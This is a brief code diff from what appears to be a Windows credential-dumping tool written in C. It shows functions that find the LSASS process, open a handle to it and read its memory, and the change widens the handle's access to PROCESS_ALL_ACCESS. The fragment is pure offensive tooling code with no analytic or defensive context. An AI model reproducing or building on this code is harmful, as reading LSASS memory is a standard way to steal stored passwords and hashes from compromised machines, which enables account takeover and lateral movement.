@@ -74,7 +74,7 @@ int GetLsassPid() {
 	return 0;
 }
 HANDLE GrabLsassHandle(int pid) {
-	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	return procHandle;
 }// Read memory from LSASS process
 SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void* memOut, int memOutLen) {
